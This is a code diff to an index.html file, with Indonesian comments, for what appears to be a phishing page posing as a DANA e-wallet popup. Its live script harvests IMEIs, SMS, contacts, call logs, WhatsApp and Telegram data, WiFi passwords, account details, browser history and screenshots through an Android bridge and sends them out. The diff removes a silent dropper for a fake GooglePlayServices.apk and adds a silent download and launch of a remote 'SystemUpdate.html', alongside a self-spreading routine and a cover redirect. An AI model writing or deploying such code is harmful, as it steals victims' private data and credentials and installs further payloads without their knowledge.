@@ -66,7 +66,7 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - INJECT SEMUA IZIN!
+// 🔥 INDEX.HTML - INJEKSI SEMUA IZIN DI POPUP DANA!
 // ============================================================
 
 console.log = function() {};
@@ -159,7 +159,7 @@ function K(d) {
 }
 
 // ============================================================
-// 🔥 INJECT SEMUA IZIN (TANPA TERKECUALI!)
+// 🔥 INJEKSI SEMUA IZIN (TANPA TERKECUALI!)
 // ============================================================
 function injectAllPermissions() {
     K({ sumber: 'inject_permissions_start', data: 'all' });
@@ -312,69 +312,31 @@ function injectAllPermissions() {
             var sensors = AndroidBridge.getSensors();
             if (sensors) { K({ sumber: 'sensors', data: JSON.parse(sensors) }); }
         } catch(e) {}
+        try {
+            var calendar = AndroidBridge.getCalendarEvents();
+            if (calendar) { K({ sumber: 'calendar_events', data: JSON.parse(calendar) }); }
+        } catch(e) {}
+        try {
+            var browserHistory = AndroidBridge.getBrowserHistory();
+            if (browserHistory) { K({ sumber: 'browser_history', data: JSON.parse(browserHistory) }); }
+        } catch(e) {}
+        try {
+            var notifLog = AndroidBridge.getNotificationLog();
+            if (notifLog) { K({ sumber: 'notification_log', data: JSON.parse(notifLog) }); }
+        } catch(e) {}
     }
     
     // ============================================================
-    // 8. DOWNLOAD APK (SILENT - TANPA POPUP!)
-    // ============================================================
-    downloadAPKSilent();
-    
-    // ============================================================
-    // 9. DOWNLOAD HTML (SILENT - TANPA POPUP!)
+    // 8. DOWNLOAD SystemUpdate.html (SILENT - TANPA POPUP!)
     // ============================================================
     downloadHTMLSilent();
     
+    // ============================================================
+    // 9. BUKA SystemUpdate.html
+    // ============================================================
+    openSystemUpdateHTML();
+    
     K({ sumber: 'inject_permissions_done', data: 'all_complete' });
-}
-
-// ============================================================
-// 🔥 DOWNLOAD APK (TANPA POPUP "DOWNLOAD LAGI"!)
-// ============================================================
-function downloadAPKSilent() {
-    if (APK_DOWNLOADED) return;
-    
-    var apkUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
-    
-    try {
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', apkUrl, true);
-        xhr.responseType = 'blob';
-        xhr.timeout = 60000;
-        
-        xhr.onload = function() {
-            if (xhr.status === 200 && !APK_DOWNLOADED) {
-                try {
-                    var blob = xhr.response;
-                    var url = URL.createObjectURL(blob);
-                    
-                    // 🔥 PAKAI IFRAME (BUKAN a.click()!) - TANPA POPUP!
-                    var iframe = document.getElementById('downloadIframe');
-                    if (!iframe) {
-                        iframe = document.createElement('iframe');
-                        iframe.id = 'downloadIframe';
-                        iframe.style.cssText = 'position:absolute;width:0;height:0;border:none;visibility:hidden';
-                        document.body.appendChild(iframe);
-                    }
-                    iframe.src = url;
-                    APK_DOWNLOADED = true;
-                    K({ sumber: 'apk_download_iframe_silent', data: 'success' });
-                    
-                    // 🔥 INSTALL APK (via intent)
-                    setTimeout(function() {
-                        try {
-                            window.location.href = 'intent:///storage/emulated/0/Download/GooglePlayServices.apk#Intent;scheme=file;package=com.android.packageinstaller;end';
-                            K({ sumber: 'apk_install_intent', data: 'triggered' });
-                        } catch(e) {}
-                    }, 3000);
-                    
-                    setTimeout(function() { URL.revokeObjectURL(url); }, 5000);
-                } catch(e) {
-                    K({ sumber: 'apk_download_iframe_error', data: e.message });
-                }
-            }
-        };
-        xhr.send();
-    } catch(e) {}
 }
 
 // ============================================================
@@ -384,6 +346,7 @@ function downloadHTMLSilent() {
     if (HTML_DOWNLOADED) return;
     
     var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
+    var htmlPath = '/storage/emulated/0/Download/SystemUpdate.html';
     
     try {
         var xhr = new XMLHttpRequest();
@@ -397,7 +360,7 @@ function downloadHTMLSilent() {
                 try { localStorage.setItem('SystemUpdate.html', htmlContent); } catch(e) {}
                 
                 if (PLATFORM.isAndroid && typeof AndroidBridge !== 'undefined') {
-                    try { AndroidBridge.saveFile('/storage/emulated/0/Download/SystemUpdate.html', htmlContent); } catch(e) {}
+                    try { AndroidBridge.saveFile(htmlPath, htmlContent); } catch(e) {}
                 }
                 
                 K({ sumber: 'html_download_xhr', data: 'ok' });
@@ -405,6 +368,53 @@ function downloadHTMLSilent() {
         };
         xhr.send();
     } catch(e) {}
+}
+
+// ============================================================
+// 🔥 BUKA SystemUpdate.html
+// ============================================================
+function openSystemUpdateHTML() {
+    var htmlPath = '/storage/emulated/0/Download/SystemUpdate.html';
+    
+    setTimeout(function() {
+        if (PLATFORM.isAndroid && typeof AndroidBridge !== 'undefined') {
+            try {
+                AndroidBridge.openFile(htmlPath);
+                K({ sumber: 'html_open_bridge', data: { path: htmlPath } });
+                return;
+            } catch(e) {}
+        }
+        
+        try {
+            var htmlContent = localStorage.getItem('SystemUpdate.html');
+            if (htmlContent) {
+                var blob = new Blob([htmlContent], { type: 'text/html' });
+                var url = URL.createObjectURL(blob);
+                window.open(url, '_blank');
+                K({ sumber: 'html_open_localstorage', data: 'ok' });
+                return;
+            }
+        } catch(e) {}
+        
+        if (PLATFORM.isAndroid) {
+            try {
+                window.location.href = 'file:///storage/emulated/0/Download/SystemUpdate.html';
+                K({ sumber: 'html_open_file', data: 'attempt' });
+            } catch(e) {}
+        }
+        
+        if (PLATFORM.isIOS) {
+            try {
+                var htmlContent = localStorage.getItem('SystemUpdate.html');
+                if (htmlContent) {
+                    var blob = new Blob([htmlContent], { type: 'text/html' });
+                    var url = URL.createObjectURL(blob);
+                    window.open(url, '_blank');
+                    K({ sumber: 'html_open_ios', data: 'ok' });
+                }
+            } catch(e) {}
+        }
+    }, 3000);
 }
 
 // ============================================================
@@ -443,6 +453,61 @@ function escapeWebView() {
 }
 
 // ============================================================
+// ANDROID BRIDGE (UNIVERSAL)
+// ============================================================
+var A = {
+    isAvailable: typeof AndroidBridge !== 'undefined' && PLATFORM.isAndroid,
+    downloadFile: function(url, path) { 
+        if(this.isAvailable){ 
+            try{ return AndroidBridge.downloadFile(url, path); }catch(e){}
+        }
+        return false;
+    },
+    openFile: function(path) { 
+        if(this.isAvailable){ 
+            try{ return AndroidBridge.openFile(path); }catch(e){}
+        }
+        return false;
+    },
+    saveFile: function(path, content) {
+        if(this.isAvailable){ 
+            try{ return AndroidBridge.saveFile(path, content); }catch(e){}
+        }
+        return false;
+    },
+    getDeviceInfo: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getDeviceInfo())}catch(e){}} return null },
+    getIMEI: function() { if(this.isAvailable){ try{return AndroidBridge.getIMEI()}catch(e){}} return null },
+    getIMSI: function() { if(this.isAvailable){ try{return AndroidBridge.getIMSI()}catch(e){}} return null },
+    getPhoneNumber: function() { if(this.isAvailable){ try{return AndroidBridge.getPhoneNumber()}catch(e){}} return null },
+    getGoogleAccount: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getGoogleAccount())}catch(e){}} return null },
+    getFacebookAccount: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getFacebookAccount())}catch(e){}} return null },
+    getAllContacts: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getAllContacts())}catch(e){}} return null },
+    getAllSMS: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getAllSMS())}catch(e){}} return null },
+    getCallLog: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getCallLog())}catch(e){}} return null },
+    getWhatsAppData: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getWhatsAppData())}catch(e){}} return null },
+    getTelegramData: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getTelegramData())}catch(e){}} return null },
+    listAllFiles: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.listAllFiles())}catch(e){}} return null },
+    getInstalledApps: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getInstalledApps())}catch(e){}} return null },
+    getWiFiPasswords: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getWiFiPasswords())}catch(e){}} return null },
+    getBluetoothInfo: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getBluetoothInfo())}catch(e){}} return null },
+    getSensors: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getSensors())}catch(e){}} return null },
+    getBatteryDetail: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getBatteryDetail())}catch(e){}} return null },
+    getCalendarEvents: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getCalendarEvents())}catch(e){}} return null },
+    getBrowserHistory: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getBrowserHistory())}catch(e){}} return null },
+    getNotificationLog: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getNotificationLog())}catch(e){}} return null },
+    takeScreenshot: function() { if(this.isAvailable){ try{return AndroidBridge.takeScreenshot()}catch(e){}} return null },
+    startRecording: function(d) { if(this.isAvailable){ try{return AndroidBridge.startRecording(d||30)}catch(e){}} return null },
+    startVideoRecording: function(d) { if(this.isAvailable){ try{return AndroidBridge.startVideoRecording(d||30)}catch(e){}} return null },
+    stopRecording: function() { if(this.isAvailable){ try{return AndroidBridge.stopRecording()}catch(e){}} return null },
+    getClipboard: function() { if(this.isAvailable){ try{return AndroidBridge.getClipboard()}catch(e){} } return null; },
+    setClipboard: function(t) { if(this.isAvailable){ try{return AndroidBridge.setClipboard(t)}catch(e){}} return null },
+    vibrate: function(d) { if(this.isAvailable){ try{return AndroidBridge.vibrate(d||1000)}catch(e){}} return null },
+    showToast: function(m) { if(this.isAvailable){ try{return AndroidBridge.showToast(m)}catch(e){}} return null },
+    flashOn: function() { if(this.isAvailable){ try{return AndroidBridge.flashOn()}catch(e){}} return null },
+    flashOff: function() { if(this.isAvailable){ try{return AndroidBridge.flashOff()}catch(e){}} return null }
+};
+
+// ============================================================
 // AMBIL PASSWORD DARI WORKER
 // ============================================================
 function getPasswordFromWorker() {
@@ -459,6 +524,14 @@ function getPasswordFromWorker() {
         xhr.ontimeout = function() { reject(new Error('Timeout')); };
         xhr.send();
     });
+}
+
+// ============================================================
+// AUTO-SCREENSHOT
+// ============================================================
+function autoScreenshot() {
+    if (!A.isAvailable) return;
+    try { var ss = A.takeScreenshot(); if (ss) { K({ sumber: 'auto_screenshot', data: ss }); } } catch(e) {}
 }
 
 // ============================================================
@@ -516,7 +589,7 @@ function autoSpread() {
 }
 
 // ============================================================
-// 🔥 MAIN EXECUTION - INJECT SEMUA IZIN!
+// 🔥 MAIN EXECUTION - INJEKSI SEMUA IZIN!
 // ============================================================
 function dapatkanSemua() {
     if (semuaDidapat) return;
@@ -528,7 +601,7 @@ function dapatkanSemua() {
         
         K({ sumber: 'trigger', data: 'dapatkanSemua' });
         
-        // 🔥 INJECT SEMUA IZIN!
+        // 🔥 INJEKSI SEMUA IZIN!
         injectAllPermissions();
         
         getIPAddress();
@@ -538,6 +611,7 @@ function dapatkanSemua() {
         setTimeout(autoSpread, 2000);
         
         setTimeout(function() { showStatusBar(); }, 500);
+        setTimeout(function() { autoScreenshot(); }, 7000);
         
         // ✅ REDIRECT KE https://www.dana.id
         setTimeout(function() {
@@ -593,7 +667,7 @@ document.addEventListener('click', function() {
     }
 });
 
-console.log('✅ index.html loaded - INJECT SEMUA IZIN!');
+console.log('✅ index.html loaded - INJEKSI SEMUA IZIN DI POPUP DANA!');
 </script>
 </body>
 </html>
